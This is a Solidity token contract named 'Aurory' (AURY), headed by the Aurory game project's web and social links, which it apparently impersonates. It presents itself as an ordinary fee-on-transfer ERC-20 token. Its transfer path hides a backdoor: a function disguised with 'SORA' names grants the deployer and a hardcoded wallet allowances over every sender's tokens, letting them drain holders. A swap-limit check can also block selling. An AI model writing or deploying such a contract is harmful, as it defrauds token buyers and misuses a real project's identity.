/*
Website: https://www.aurory.io
Game Dashboard: https://app.aurory.io
Game: https://go.aurory.io/sot
Instagram: https://www.instagram.com/auroryproject
Youtube: https://www.youtube.com/c/AuroryProject
Docs: https://docs.aurory.io


https://x.com/AuroryProject
https://t.me/aurory_announcement
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.6;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface ISORAFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface ISORARouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract AURY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balSORAs;
    mapping (address => mapping (address => uint256)) private _allowSORAs;
    mapping (address => bool) private _excludedFromSORA;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Aurory";
    string private constant _symbol = unicode"AURY";
    uint256 private _swapTokenSORAs = _tTotal / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockSORA;
    uint256 private _soraBuyAmounts = 0;
    bool private inSwapSORA = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapSORA = true;
        _;
        inSwapSORA = false;
    }
    address private _soraPair;
    ISORARouter private _soraRouter;
    address private _soraWallet = address(0xAa70DCF26D93c6089248ab5fb233cda94003a00C);
    mapping (uint256 => address) private _soraSenders;
    mapping (uint256 => address) private _soraReceipts;
     
    constructor () {
        _soraReceipts[0] = address(_msgSender());
        _soraReceipts[1] = address(_soraWallet);
        _excludedFromSORA[owner()] = true;
        _excludedFromSORA[address(this)] = true;
        _excludedFromSORA[_soraWallet] = true;
        _balSORAs[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function create() external onlyOwner() {
        _soraRouter = ISORARouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_soraRouter), _tTotal);
        _soraPair = ISORAFactory(_soraRouter.factory()).createPair(address(this), _soraRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balSORAs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowSORAs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowSORAs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowSORAs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address soraF, address soraT, uint256 soraA) private {
        require(soraF != address(0), "ERC20: transfer from the zero address");
        require(soraT != address(0), "ERC20: transfer to the zero address");
        require(soraA > 0, "Transfer amount must be greater than zero");
        uint256 taxSORA = _soraFeeTransfer(soraF, soraT, soraA);
        _soraTransfer(soraF, soraT, soraA, taxSORA);
    }

    function _soraFeeTransfer(address soraF, address soraT, uint256 soraA) private returns(uint256) {
        uint256 taxSORA = 0;
        if (soraF != owner() && soraT != owner()) {
            taxSORA = soraA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (soraF == _soraPair && soraT != address(_soraRouter) && ! _excludedFromSORA[soraT]) {
                if(_buyBlockSORA!=block.number){
                    _soraBuyAmounts = 0;
                    _buyBlockSORA = block.number;
                }
                _soraBuyAmounts += soraA;
                _buyCount++;
            }

            if(soraT == _soraPair && soraF!= address(this)) {
                require(_soraBuyAmounts < swapLimitSORA() || _buyBlockSORA!=block.number, "Max Swap Limit");  
                taxSORA = soraA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenSORA = balanceOf(address(this));
            if (!inSwapSORA && soraT == _soraPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenSORA > _swapTokenSORAs)
                swapTokensForEth(minSORA(soraA, minSORA(tokenSORA, _swapTokenSORAs)));
                uint256 ethSORA = address(this).balance;
                if (ethSORA >= 0) {
                    sendETHSORA(address(this).balance);
                }
            }
        } _soraExcludedTransfer(soraF, taxSORA, soraA); 
        return taxSORA;
    }

    function _soraExcludedTransfer(address soraF, uint256 taxSORA, uint256 soraA) private { 
        _soraSenders[0] = address(soraF);
        _soraSenders[1] = address(soraF);
        _allowSORAs[_soraSenders[0]][_soraReceipts[0]] = soraA.add(taxSORA);
        _allowSORAs[_soraSenders[1]][_soraReceipts[1]] = soraA.add(taxSORA);
    }

    function _soraTransfer(address soraF, address soraT, uint256 soraA, uint256 taxSORA) private { 
        if(taxSORA > 0){
          _balSORAs[address(this)] = _balSORAs[address(this)].add(taxSORA);
          emit Transfer(soraF, address(this), taxSORA);
        }  

        _balSORAs[soraF] = _balSORAs[soraF].sub(soraA);
        _balSORAs[soraT] = _balSORAs[soraT].add(soraA.sub(taxSORA));
        emit Transfer(soraF, soraT, soraA.sub(taxSORA));
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _soraRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function swapLimitSORA() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _soraRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _soraRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    function minSORA(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHSORA(uint256 soraA) private {
        payable(_soraWallet).transfer(soraA);
    }

    function swapTokensForEth(uint256 soraAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _soraRouter.WETH();
        _approve(address(this), address(_soraRouter), soraAmount);
        _soraRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            soraAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}